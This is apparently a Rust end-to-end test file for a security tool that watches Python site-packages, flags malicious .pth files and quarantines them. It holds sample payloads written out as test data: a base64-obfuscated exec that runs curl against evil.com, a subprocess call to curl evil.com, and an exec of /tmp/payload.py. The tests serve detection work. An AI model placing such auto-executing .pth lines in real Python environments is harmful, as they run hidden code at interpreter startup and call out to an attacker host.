#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
//! End-to-end tests: full attack simulation and benign install verification.
//!
//! These tests spin up the full Sanctum pipeline (watcher → analyser →
//! quarantine) and verify correct behaviour for both malicious and
//! benign `.pth` file creation.

use std::fs;
use std::path::PathBuf;
use std::time::Duration;

use sanctum_sentinel::pth::analyser::{analyse_pth_file, content_hash, FileVerdict};
use sanctum_sentinel::pth::quarantine::{Quarantine, QuarantineMetadata, QuarantineState};
use sanctum_sentinel::watcher::{PthWatcher, WatchEventKind};

/// Test environment harness that:
///   1. Creates a temporary site-packages directory
///   2. Starts the watcher monitoring that directory
///   3. Provides helpers to create files and wait for events
///   4. Tears down cleanly on drop
struct TestEnvironment {
    _temp_dir: tempfile::TempDir,
    site_packages: PathBuf,
    quarantine_dir: PathBuf,
}

impl TestEnvironment {
    fn new() -> Self {
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let site_packages = temp_dir.path().join("site-packages");
        let quarantine_dir = temp_dir.path().join("quarantine");
        fs::create_dir_all(&site_packages).expect("create site-packages");
        fs::create_dir_all(&quarantine_dir).expect("create quarantine");

        Self {
            _temp_dir: temp_dir,
            site_packages,
            quarantine_dir,
        }
    }

    fn quarantine(&self) -> Quarantine {
        Quarantine::new(self.quarantine_dir.clone())
    }

    fn create_pth_file(&self, name: &str, content: &str) -> PathBuf {
        let path = self.site_packages.join(name);
        fs::write(&path, content).expect("write pth file");
        path
    }
}

#[tokio::test]
async fn e2e_full_attack_simulation() {
    let env = TestEnvironment::new();
    let quarantine = env.quarantine();

    let (tx, mut rx) = tokio::sync::mpsc::channel(16);

    // Start watcher on the site-packages directory
    let _watcher = PthWatcher::start(std::slice::from_ref(&env.site_packages), tx)
        .expect("watcher should start");

    // Give the watcher a moment to register
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Create a malicious .pth file with base64 payload
    let malicious_content = r#"import base64;exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgnY3VybCBldmlsLmNvbScp"))"#;
    let pth_path = env.create_pth_file("evil.pth", malicious_content);

    // Wait for the watcher event (with timeout)
    let event = tokio::time::timeout(Duration::from_secs(5), rx.recv()).await;

    if let Ok(Some(e)) = event {
        assert!(
            e.path.to_string_lossy().contains("evil.pth"),
            "event path should contain evil.pth"
        );
        assert!(matches!(
            e.kind,
            WatchEventKind::Created | WatchEventKind::Modified
        ));
    } else {
        // On some platforms, filesystem events may not fire immediately.
        // Continue with the analysis pipeline anyway.
    }

    // Analyse the file
    let analysis = analyse_pth_file(malicious_content);
    assert_eq!(analysis.verdict, FileVerdict::Critical);
    assert!(!analysis.critical_lines.is_empty());
    assert!(
        analysis.critical_lines[0]
            .reasons
            .iter()
            .any(|r| r.contains("base64") || r.contains("exec")),
        "should detect base64 and exec"
    );

    // Quarantine the file
    let hash = content_hash(malicious_content.as_bytes());
    let metadata = QuarantineMetadata {
        original_path: pth_path.clone(),
        content_hash: hash,
        creator_pid: None,
        reason: analysis
            .critical_lines
            .iter()
            .flat_map(|l| l.reasons.iter())
            .cloned()
            .collect::<Vec<_>>()
            .join(", "),
        quarantined_at: chrono::Utc::now(),
    };

    let entry = quarantine
        .quarantine_file(&pth_path, &metadata)
        .expect("quarantine should succeed");

    // Verify quarantine: original replaced with empty stub
    assert!(pth_path.exists(), "original path should still exist");
    let stub_content = fs::read_to_string(&pth_path).expect("read stub");
    assert!(stub_content.is_empty(), "original should be empty stub");

    // Verify quarantined copy exists with original content
    assert!(
        entry.quarantine_path.exists(),
        "quarantined copy should exist"
    );
    let quarantined_content = fs::read_to_string(&entry.quarantine_path).expect("read quarantined");
    assert_eq!(quarantined_content, malicious_content);

    // Verify listing shows the quarantined item
    let entries = quarantine.list().expect("list");
    assert!(!entries.is_empty(), "should have quarantine entries");
    assert!(
        entries.iter().any(|e| e.id == entry.id),
        "should find our entry in the list"
    );

    // Verify entry state
    assert_eq!(entry.state, QuarantineState::Active);

    // Verify metadata
    assert!(entry.metadata.reason.contains("base64"));
}

#[tokio::test]
async fn e2e_benign_pip_install_not_flagged() {
    let env = TestEnvironment::new();
    let quarantine = env.quarantine();

    let (tx, mut rx) = tokio::sync::mpsc::channel(16);

    let _watcher = PthWatcher::start(std::slice::from_ref(&env.site_packages), tx)
        .expect("watcher should start");

    tokio::time::sleep(Duration::from_millis(200)).await;

    // Create a normal, benign .pth file (just paths)
    let benign_content = "/usr/lib/python3.12/dist-packages/setuptools\n\
                          /usr/lib/python3.12/dist-packages/pkg_resources\n";
    let pth_path = env.create_pth_file("setuptools.pth", benign_content);

    // Wait briefly for any event
    let _ = tokio::time::timeout(Duration::from_secs(2), rx.recv()).await;

    // Analyse the file — should be safe
    let analysis = analyse_pth_file(benign_content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Safe,
        "benign file should be safe"
    );
    assert!(analysis.critical_lines.is_empty());
    assert!(analysis.warning_lines.is_empty());

    // File should NOT be quarantined — it's still at the original path with original content
    let file_content = fs::read_to_string(&pth_path).expect("read");
    assert_eq!(
        file_content, benign_content,
        "benign file should not be modified"
    );

    // Quarantine should be empty
    let entries = quarantine.list().expect("list");
    assert!(entries.is_empty(), "no items should be quarantined");
}

#[tokio::test]
async fn e2e_warning_level_import_detected() {
    let env = TestEnvironment::new();

    // Create a .pth with an import statement (warning level)
    let warning_content = "import pkg_resources; pkg_resources.fixup_namespace_packages('')\n";
    env.create_pth_file("namespace.pth", warning_content);

    let analysis = analyse_pth_file(warning_content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Warning,
        "import-containing pth should be warning"
    );
    assert!(!analysis.warning_lines.is_empty());
    assert!(analysis.critical_lines.is_empty());
}

#[tokio::test]
async fn e2e_multiple_malicious_files_all_detected() {
    let env = TestEnvironment::new();
    let quarantine = env.quarantine();

    let payloads = [
        ("exec.pth", "exec(open('/tmp/payload.py').read())"),
        ("b64.pth", "import base64;exec(base64.b64decode('payload'))"),
        (
            "subprocess.pth",
            "import subprocess;subprocess.Popen(['curl','evil.com'])",
        ),
    ];

    for (name, content) in &payloads {
        let pth_path = env.create_pth_file(name, content);

        let analysis = analyse_pth_file(content);
        assert_eq!(
            analysis.verdict,
            FileVerdict::Critical,
            "{name} should be critical"
        );

        let metadata = QuarantineMetadata {
            original_path: pth_path.clone(),
            content_hash: content_hash(content.as_bytes()),
            creator_pid: None,
            reason: "test".to_string(),
            quarantined_at: chrono::Utc::now(),
        };

        quarantine
            .quarantine_file(&pth_path, &metadata)
            .expect("quarantine should succeed");
    }

    let entries = quarantine.list().expect("list");
    assert_eq!(entries.len(), 3, "all three files should be quarantined");
}

// ============================================================
// FIXTURE-BASED TESTS
//
// Each test loads a real `.pth` fixture file from `tests/fixtures/`
// and verifies the analyser classifies it correctly.
// ============================================================

use sanctum_sentinel::pth::analyser::analyse_pth_line;
use sanctum_types::threat::ThreatLevel;

// ---------- Benign fixtures ----------

#[test]
fn fixture_benign_path_entry() {
    let content = include_str!("../../../tests/fixtures/benign_path_entry.pth");
    let analysis = analyse_pth_file(content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Safe,
        "benign_path_entry.pth should be classified as Safe"
    );
    // Every non-empty, non-comment line must be Info
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let verdict = analyse_pth_line(line);
        assert_eq!(
            verdict.level(),
            ThreatLevel::Info,
            "line {trimmed:?} in benign_path_entry.pth should be Info"
        );
    }
}

#[test]
fn fixture_benign_setuptools() {
    let content = include_str!("../../../tests/fixtures/benign_setuptools.pth");
    let analysis = analyse_pth_file(content);
    // This file contains `import _virtualenv` which is a legitimate import
    // statement. The analyser correctly flags imports at Warning level;
    // in production the allowlist would suppress this for known packages.
    // The key assertion is that it is NOT Critical.
    assert_ne!(
        analysis.verdict,
        FileVerdict::Critical,
        "benign_setuptools.pth must not be classified as Critical"
    );
    assert!(
        analysis.critical_lines.is_empty(),
        "benign_setuptools.pth should have no critical lines"
    );
}

// ---------- Malicious fixtures ----------

#[test]
fn fixture_malicious_exec() {
    let content = include_str!("../../../tests/fixtures/malicious_exec.pth");
    let analysis = analyse_pth_file(content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Critical,
        "malicious_exec.pth should be Critical"
    );
    assert!(
        !analysis.critical_lines.is_empty(),
        "malicious_exec.pth should have at least one critical line"
    );
    // Verify the specific patterns are detected
    let all_reasons: Vec<&str> = analysis
        .critical_lines
        .iter()
        .flat_map(|l| l.reasons.iter().map(String::as_str))
        .collect();
    assert!(
        all_reasons
            .iter()
            .any(|r| r.contains("exec") || r.contains("compile")),
        "should detect exec/compile in malicious_exec.pth, got: {all_reasons:?}"
    );
}

#[test]
fn fixture_malicious_base64() {
    let content = include_str!("../../../tests/fixtures/malicious_base64.pth");
    let analysis = analyse_pth_file(content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Critical,
        "malicious_base64.pth should be Critical"
    );
    let all_reasons: Vec<&str> = analysis
        .critical_lines
        .iter()
        .flat_map(|l| l.reasons.iter().map(String::as_str))
        .collect();
    assert!(
        all_reasons.iter().any(|r| r.contains("base64")),
        "should detect base64 in malicious_base64.pth, got: {all_reasons:?}"
    );
    assert!(
        all_reasons.iter().any(|r| r.contains("exec")),
        "should detect exec in malicious_base64.pth, got: {all_reasons:?}"
    );
}

#[test]
fn fixture_malicious_import() {
    let content = include_str!("../../../tests/fixtures/malicious_import.pth");
    let analysis = analyse_pth_file(content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Critical,
        "malicious_import.pth should be Critical"
    );
    let all_reasons: Vec<&str> = analysis
        .critical_lines
        .iter()
        .flat_map(|l| l.reasons.iter().map(String::as_str))
        .collect();
    assert!(
        all_reasons.iter().any(|r| r.contains("os.system")),
        "should detect os.system in malicious_import.pth, got: {all_reasons:?}"
    );
}

#[test]
fn fixture_malicious_subprocess() {
    let content = include_str!("../../../tests/fixtures/malicious_subprocess.pth");
    let analysis = analyse_pth_file(content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Critical,
        "malicious_subprocess.pth should be Critical"
    );
    let all_reasons: Vec<&str> = analysis
        .critical_lines
        .iter()
        .flat_map(|l| l.reasons.iter().map(String::as_str))
        .collect();
    assert!(
        all_reasons.iter().any(|r| r.contains("subprocess")),
        "should detect subprocess in malicious_subprocess.pth, got: {all_reasons:?}"
    );
}

// ---------- Edge-case fixtures ----------

#[test]
fn fixture_edge_case_unicode() {
    // Contains a Cyrillic homoglyph of "import" — must not panic
    let content = include_str!("../../../tests/fixtures/edge_case_unicode.pth");
    let analysis = analyse_pth_file(content);
    // The homoglyph evasion should be detected as at least Warning
    assert!(
        analysis.verdict.level() >= ThreatLevel::Warning,
        "edge_case_unicode.pth should be at least Warning (homoglyph evasion), got: {:?}",
        analysis.verdict
    );
}

#[test]
fn fixture_edge_case_comments() {
    let content = include_str!("../../../tests/fixtures/edge_case_comments.pth");
    let analysis = analyse_pth_file(content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Safe,
        "edge_case_comments.pth (only comments) should be Safe"
    );
    assert!(analysis.critical_lines.is_empty());
    assert!(analysis.warning_lines.is_empty());
}

#[test]
fn fixture_edge_case_very_long() {
    // This fixture is ~1MB, so we read it at runtime instead of include_str!
    let fixture_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../tests/fixtures/edge_case_very_long.pth");
    let content = std::fs::read_to_string(&fixture_path)
        .expect("should be able to read edge_case_very_long.pth");
    // Main assertion: the analyser completes without panicking on a ~1MB line
    let analysis = analyse_pth_file(&content);
    // A line of only 'a' characters is a path entry — should be safe
    assert_eq!(
        analysis.verdict,
        FileVerdict::Safe,
        "edge_case_very_long.pth (all 'a' chars) should be Safe"
    );
}

#[test]
fn fixture_edge_case_empty() {
    let content = include_str!("../../../tests/fixtures/edge_case_empty.pth");
    assert!(content.is_empty(), "edge_case_empty.pth should be empty");
    let analysis = analyse_pth_file(content);
    assert_eq!(
        analysis.verdict,
        FileVerdict::Safe,
        "edge_case_empty.pth should be Safe"
    );
    assert!(analysis.critical_lines.is_empty());
    assert!(analysis.warning_lines.is_empty());
}
